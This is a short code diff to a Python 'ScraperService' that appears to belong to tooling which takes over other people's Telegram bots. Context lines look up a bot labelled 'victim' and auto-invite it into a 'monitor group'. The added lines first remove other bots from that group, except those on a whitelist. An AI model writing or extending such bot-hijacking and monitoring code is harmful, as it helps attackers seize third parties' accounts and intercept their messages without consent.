@@ -126,6 +126,12 @@ class ScraperService:
                          if me_res.get("ok"):
                              victim_username = me_res["result"]["username"]
                              print(f"    [Scraper] Auto-inviting @{victim_username} to monitor group...")
+                             
+                             # CLEANUP: Remove other bots first (as requested)
+                             whitelist = [x.strip() for x in settings.WHITELISTED_BOT_IDS.split(",") if x.strip()]
+                             if whitelist:
+                                 await user_agent.cleanup_bots(dest_chat_id, whitelist)
+                                 
                              await user_agent.invite_bot_to_group(victim_username, dest_chat_id)
                      except Exception as e_invite:
                          print(f"    ⚠️ [Scraper] Auto-invite failed (skipping): {e_invite}")
